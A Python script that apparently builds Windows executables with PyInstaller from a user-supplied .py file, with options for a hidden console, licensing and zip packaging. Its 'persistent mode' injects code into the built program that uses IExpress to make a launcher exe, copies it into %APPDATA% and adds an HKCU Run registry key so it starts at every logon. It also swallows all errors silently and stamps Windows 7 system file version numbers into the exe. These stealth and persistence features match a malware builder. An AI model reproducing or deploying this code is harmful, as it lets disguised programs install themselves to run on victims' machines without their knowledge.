import os
from zipfile import ZipFile
import shutil

#Version: 1.4.5

class Builder():
    def __init__(self):
        self.settings()
        self.path = os.getcwd() + '\\'
        
        files = os.listdir(self.path)
        files.remove(__file__.split('\\')[-1])
        for file in files:
            if file.find('.py') != -1:
                self.beta_name = file
            elif file.find('.ico') != -1:
                self.icon = file
        self.name = self.beta_name[:-3]
        self.new_name = 'Build_' + self.beta_name
        
        self.license = '''A. TERMS AND CONDITIONS
===============================================================

This software is developed and distributed by the company "''' + self.company + '''".

--------------------------------------------------------------------------


1. Redistributions of source code must retain the above copyright
   notice, this list of conditions and the following disclaimer.

2. The origin of this software must not be misrepresented; you must 
   not claim that you wrote the original software.  If you use this 
   software in a product, an acknowledgment in the product 
   documentation would be appreciated but is not required.

3. Altered source versions must be plainly marked as such, and must
   not be misrepresented as being the original software.

4. The name of the author may not be used to endorse or promote 
   products derived from this software without specific prior written 
   permission.

THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


/* ====================================================================
 * Copyright (c) 2020 ''' + self.company + '''.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the documentation and/or other materials provided with the
 *    distribution.
 *
 * 3. All advertising materials mentioning features or use of this
 *    software must display the following acknowledgment:
 *    "This product includes software developed by ''' + self.company + '''.
 *
 * 4. The name "''' + self.company + '''" must not be used to endorse or promote
 *    products derived from this software without prior written 
 *    permission. For written permission, please contact.
 *
 * 5. Products derived from this software may not be called "''' + self.company + '''"
 *    nor may "''' + self.company + '''" appear in their names without prior written
 *    permission of ''' + self.company + '''.
 *
 * 6. Redistributions of any form whatsoever must retain the following
 *    acknowledgment:
 *    "This product includes software developed by ''' + self.company + '''"
 *
 * THIS SOFTWARE IS PROVIDED BY ''' + self.company + ''' AND ANY EXPRESSED OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL ''' + self.company + ''' OR ITS CONTRIBUTORS
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY,
 * OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT
 * OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 * OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH 
 * DAMAGE.
 */====================================================================
'''
        
        
    def settings(self):
        self.default_mode = input('Default Mode (y/n): ').lower()
        if self.default_mode != 'y':
            self.console = input('Console (y/n): ').lower()
            self.extra_data = input('Extra Folder (default for none): ')
            self.version = input('Version (default 1.0.0): ')
            if self.version == '':
                self.version = '1.0.0'
            self.test_mode = input('Test Mode (y/n): ').lower()
            self.license_mode = input('License Mode (y/n): ').lower()
            self.persistent_mode = input('Persistent Mode (y/n) (seprimental): ').lower()
            if self.persistent_mode == 'y':
                self.linked_name = input('Linked File Name: ')
                if self.linked_name == '':
                    self.linked_name = 'test'
            self.company = input('Company (default none): ')
            if self.company == '':
                self.company = 'None'
        else:
            self.console = 'y'
            self.extra_data = ''
            self.version = '1.0.0'
            self.test_mode = 'y'
            self.license_mode = 'n'
            self.persistent_mode = 'n'
            self.company = 'None'


    def new_code(self):
        with open(self.beta_name, 'r') as beta_code:
            code = beta_code.read()
        new_code = []
        for line in code.split('\n'):
            new_code.append('    ' + line)
        new_code.insert(0,'try:')
        if self.persistent_mode == 'y':
            new_code.insert(1, self.make_persistent())
        if self.license_mode == 'y':
            new_code.insert(1, '    License = ' + "\"\"\"" + self.license + "\"\"\"")
            new_code.insert(2, '    if open(\'LICENSE.txt\',\'r\').read() != License: exit()')
        if self.test_mode == 'n' or self.test_mode == '':
            new_code.append('except:\n    pass')
        else:
            new_code.append('except Exception as err:\n    print(err)\n    input()')
        lines = ''
        for line in new_code:
            lines += line + '\n'
        with open(self.new_name, 'w') as build:
            build.write(lines)


    def make_persistent(self):
            return """    import subprocess, os

    def persistent():
        name = '""" + self.linked_name + """'
        location = os.environ['appdata'] + "\\\\" + name + ".exe"
        if not os.path.exists(location):
            path = os.getcwd() + '\\\\'      

            exer = ''';@echo off
;echo(
;set "target.exe=%__cd__%%~n1.exe"
;set "batch_file=%~f1"
;set "bat_name=%~nx1"
;set "bat_dir=%~dp1"
;Set "sed=%temp%\\\\2exe.sed"
;copy /y "%~f0" "%sed%" >nul
;(
    ;(echo(AppLaunched=cmd /c "%bat_name%")
    ;(echo(TargetName=%target.exe%)
    ;(echo(FILE0="%bat_name%")
    ;(echo([SourceFiles])
    ;(echo(SourceFiles0=%bat_dir%)
    ;(echo([SourceFiles0])
    ;(echo(%%FILE0%%=)
;)>>"%sed%"

;iexpress /n /q /m %sed%
;del /q /f "%sed%"
;exit /b 0

[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=0
HideExtractAnimation=1
UseLongFileName=1
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles

[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
FriendlyName=-
PostInstallCmd=<None>
AdminQuietInstCmd=
'''
        
            linked = '''@echo off
"''' + path + '""" + self.name + """.exe' + '"'
        
        
            with open('exer.bat', 'w') as exe:
                exe.write(exer)
            with open(name + '.bat', 'w') as test:
                test.write(linked)

            os.system('exer.bat ' + name + '.bat')

            subprocess.call('copy ' + path + name + '.exe ' + location, shell=True)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ' + name + ' /t REG_SZ /d "' + location + '"', shell=True)

            os.system('cls')
            os.remove('exer.bat')
            os.remove(name + '.bat')
            os.remove(name + '.exe')


    persistent()
"""
        

    def define_details(self):
        description = self.name
        info = """
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(6, 1, 7601, 17514),
    prodvers=(6, 1, 7601, 17514),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'""" + self.company + """'),
        StringStruct(u'FileDescription', u'""" + description + """'),
        StringStruct(u'FileVersion', u'""" + self.version + """'),
        StringStruct(u'InternalName', u'""" + self.name + """'),
        StringStruct(u'LegalCopyright', u'\\xa9 """ + self.company + """. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'""" + self.name + """.exe'),
        StringStruct(u'ProductName', u'""" + self.name + """.exe'),
        StringStruct(u'ProductVersion', u'""" + self.version + """')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
"""
        with open('Version.txt','w') as version_file:
            version_file.write(info)


    def build_command(self):
        self.command = 'py -O -m PyInstaller "' + self.path + self.new_name + '" -F '
        try:
            if self.icon:
                self.command += '-i "' + self.icon + '" '
        except:
            pass
        if self.console == 'n' or self.console == '':
            self.command += '-w '
        if self.extra_data != '':
            self.command += '--add-data "' + self.path + self.extra_data + '";. '
        self.command += '-n "' + self.name  + '" --version-file ' + '"' + self.path + 'Version.txt' + '"'


    def pack(self):
        with open('LICENSE.txt', 'w') as lic:
            lic.write(self.license)
        shutil.move('dist\\' + self.name + '.exe', self.name + '.exe')
        zip_file = ZipFile(self.name + '_' + self.version + '.zip', 'w')
        zip_file.write(self.name + '.exe')
        zip_file.write('LICENSE.txt')
        zip_file.close()


    def clean(self):
        os.remove(self.new_name)
        
        for file in os.listdir(self.path + 'build\\' + self.name):
            os.remove('build\\' + self.name + '\\' + file)
        os.remove('__pycache__\\' + os.listdir(self.path + '\\__pycache__')[0])
        os.rmdir('dist')
        os.rmdir('build\\' + self.name)
        os.rmdir('build')
        os.rmdir('__pycache__')
        os.remove(self.name + '.spec')
        os.remove('Version.txt')
        os.remove('LICENSE.txt')
        os.remove(self.name + '.exe')


    def execute(self):
        self.new_code()
        print("[+] Code elaborated")
        self.define_details()
        print('[+] Defined details')
        self.build_command()
        print('[+] Command built')
        print('>>> ' + self.command)
        os.system(self.command)
        self.pack()
        print('\n\n\n[+] Packaged')
        try:
            self.clean()
        except Exception:
            pass
        print('[+] Cleaned')
        print('[+] All Done')
        input('\nPress Enter to Exit')



my_builder = Builder()
my_builder.execute()



            

